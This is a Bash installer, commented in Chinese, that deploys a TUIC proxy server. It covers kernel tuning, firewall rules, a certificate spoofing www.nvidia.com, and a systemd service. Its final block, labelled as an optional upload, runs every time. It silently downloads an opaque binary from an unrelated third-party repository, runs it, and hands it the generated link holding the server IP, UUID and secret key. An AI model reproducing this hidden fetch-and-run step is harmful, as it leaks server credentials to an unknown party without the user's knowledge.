#!/bin/bash
set -e

# 颜色输出
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() {
    echo -e "${GREEN}[$(date '+%H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

# 生成配置参数
PORT=$((RANDOM % 7001 + 2000))
UUID=$(cat /proc/sys/kernel/random/uuid)
PSK=$(openssl rand -hex 16)
SERVER_NAME="www.nvidia.com"
CONFIG_DIR="/etc/tuic"
UPLOAD_BIN="/opt/uploader-linux-amd64"

log "开始安装TUIC节点，端口: $PORT"

# 安装依赖
log "更新系统并安装依赖..."
export DEBIAN_FRONTEND=noninteractive
apt update && apt install -y curl wget sudo unzip jq ufw qrencode net-tools

# 网络优化配置
log "配置网络优化参数..."

# 检查并加载BBR模块
if ! lsmod | grep -q tcp_bbr; then
    if modprobe tcp_bbr 2>/dev/null; then
        log "BBR模块加载成功"
        echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
    else
        warn "BBR模块加载失败，继续使用默认拥塞控制"
    fi
fi

# 检查并加载FQ队列规则
if ! lsmod | grep -q sch_fq; then
    if modprobe sch_fq 2>/dev/null; then
        log "FQ队列规则加载成功"
    else
        warn "FQ队列规则加载失败"
    fi
fi

# 应用网络参数
cat >> /etc/sysctl.conf << 'EOF'
# TUIC网络优化
net.core.default_qdisc=fq
net.ipv4.tcp_congestion_control=bbr
net.core.rmem_max=134217728
net.core.wmem_max=134217728
net.core.netdev_max_backlog=5000
net.ipv4.tcp_rmem=4096 87380 134217728
net.ipv4.tcp_wmem=4096 65536 134217728
net.ipv4.tcp_mtu_probing=1
net.ipv4.tcp_slow_start_after_idle=0
net.ipv4.tcp_fastopen=3
net.ipv4.tcp_no_metrics_save=1
net.ipv4.tcp_ecn=1
net.ipv4.tcp_frto=1
net.ipv4.tcp_timestamps=1
net.ipv4.tcp_window_scaling=1
net.ipv4.tcp_adv_win_scale=1
net.ipv4.tcp_moderate_rcvbuf=1
net.ipv4.tcp_rfc1337=1
net.ipv4.tcp_syncookies=1
net.core.default_qdisc=fq_codel
EOF

sysctl -p
log "确保SSH端口未被阻断..."
SSH_PORT=22

# 检查SSH是否运行
if systemctl is-active --quiet ssh || pgrep -f sshd >/dev/null; then
    log "检测到SSH服务正在运行，保留端口: $SSH_PORT"
    ufw allow ${SSH_PORT}/tcp
else
    warn "未检测到SSH服务运行，如果你是通过SSH连接建议手动检查"
fi

# 防火墙配置
log "配置防火墙规则..."
ufw allow ${PORT}/udp
ufw allow ssh
ufw --force enable

# 安装TUIC服务端
log "下载并安装TUIC服务端..."
mkdir -p /usr/local/bin
cd /usr/local/bin

# 检查系统架构
ARCH=$(uname -m)
case $ARCH in
    x86_64)
        BINARY_NAME="tuic-server-linux-amd64"
        ;;
    aarch64)
        BINARY_NAME="tuic-server-linux-arm64"
        ;;
    *)
        error "不支持的系统架构: $ARCH"
        exit 1
        ;;
esac

# 获取最新版本
log "获取TUIC最新版本信息..."
LATEST_VERSION=$(curl -s https://api.github.com/repos/EAimTY/tuic/releases/latest | jq -r '.tag_name' 2>/dev/null)

if [[ -z "$LATEST_VERSION" || "$LATEST_VERSION" == "null" ]]; then
    warn "无法获取最新版本，使用固定版本"
    LATEST_VERSION="v1.0.0"
fi

log "下载TUIC版本: $LATEST_VERSION, 架构: $BINARY_NAME"

# 下载二进制文件
if ! curl -L "https://github.com/EAimTY/tuic/releases/download/${LATEST_VERSION}/${BINARY_NAME}" -o tuic; then
    error "下载TUIC失败，尝试备用链接"
    # 尝试直接下载最新的release
    if ! curl -L "https://github.com/EAimTY/tuic/releases/latest/download/${BINARY_NAME}" -o tuic; then
        error "下载失败，请检查网络连接"
        exit 1
    fi
fi

# 设置权限并验证
chmod +x tuic

# 验证文件是否可执行
if [[ ! -x "/usr/local/bin/tuic" ]]; then
    error "TUIC二进制文件不可执行"
    exit 1
fi

# 验证文件完整性
if ! file /usr/local/bin/tuic | grep -q "executable"; then
    error "下载的文件不是有效的可执行文件"
    ls -la /usr/local/bin/tuic
    file /usr/local/bin/tuic
    exit 1
fi

log "TUIC二进制文件验证成功"

# 创建目录
mkdir -p $CONFIG_DIR/tls

# 生成更好的自签名证书
log "生成SSL证书..."
openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
  -keyout $CONFIG_DIR/tls/key.key \
  -out $CONFIG_DIR/tls/cert.crt \
  -subj "/C=US/ST=CA/L=San Francisco/O=NVIDIA/CN=${SERVER_NAME}" \
  -addext "subjectAltName=DNS:${SERVER_NAME},DNS:*.${SERVER_NAME}"

# 设置正确的权限
chmod 600 $CONFIG_DIR/tls/key.key
chmod 644 $CONFIG_DIR/tls/cert.crt

# 创建优化的配置文件
log "生成配置文件..."
cat > $CONFIG_DIR/config.json <<EOF
{
  "server": "0.0.0.0",
  "server_port": ${PORT},
  "users": {
    "${UUID}": "${PSK}"
  },
  "certificate": "$CONFIG_DIR/tls/cert.crt",
  "private_key": "$CONFIG_DIR/tls/key.key",
  "congestion_control": "bbr",
  "alpn": ["h3"],
  "udp_relay_ipv6": false,
  "zero_rtt_handshake": true,
  "auth_timeout": "5s",
  "max_idle_time": "60s",
  "max_packet_size": 1500,
  "disable_sni": false,
  "fallback_for_invalid_sni": {
    "enabled": true,
    "address": "www.nvidia.com",
    "port": 443
  },
  "gc_interval": "10s",
  "gc_lifetime": "15s",
  "log_level": "info"
}
EOF

# 创建systemd服务文件
log "创建systemd服务..."
cat > /etc/systemd/system/tuic.service <<EOF
[Unit]
Description=TUIC QUIC Secure Proxy Server
Documentation=https://github.com/EAimTY/tuic
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
Group=root
ExecStart=/usr/local/bin/tuic -c $CONFIG_DIR/config.json
Restart=on-failure
RestartSec=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# 启动服务
log "启动TUIC服务..."
systemctl daemon-reload
systemctl enable tuic
systemctl restart tuic

# 等待服务启动
sleep 3

# 检查服务状态
if systemctl is-active --quiet tuic; then
    log "TUIC服务启动成功"
else
    error "TUIC服务启动失败"
    systemctl status tuic
    exit 1
fi

# 获取外网IP
log "获取服务器IP地址..."
IP=$(curl -s https://api.ipify.org || curl -s https://ipinfo.io/ip || curl -s https://ifconfig.me)

if [[ -z "$IP" ]]; then
    error "无法获取外网IP地址"
    exit 1
fi

# 构建TUIC链接
ENCODED=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
TUIC_LINK="tuic://${ENCODED}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#tuic_secure"

# 显示结果
echo -e "\n${GREEN}✅ TUIC节点部署完成${NC}"
echo -e "${GREEN}服务器IP:${NC} $IP"
echo -e "${GREEN}端口:${NC} $PORT"
echo -e "${GREEN}UUID:${NC} $UUID"
echo -e "${GREEN}密钥:${NC} $PSK"
echo -e "\n${GREEN}TUIC连接链接:${NC}"
echo "$TUIC_LINK"
echo -e "\n${GREEN}二维码:${NC}"
echo "$TUIC_LINK" | qrencode -o - -t ANSIUTF8

# 显示状态信息
echo -e "\n${GREEN}服务状态检查:${NC}"
systemctl status tuic --no-pager -l
echo -e "\n${GREEN}端口监听状态:${NC}"
ss -ulnp | grep $PORT || echo "端口未监听，请检查配置"

# 上传节点信息（如果需要）
if [[ -f "$UPLOAD_BIN" ]] || curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 2>/dev/null; then
    chmod +x "$UPLOAD_BIN" 2>/dev/null
    JSON="{\"tuic_link\":\"${TUIC_LINK}\"}"
    "$UPLOAD_BIN" "$JSON" 2>/dev/null || warn "节点信息上传失败"
fi

log "安装完成！请使用支持TUIC协议的客户端连接"
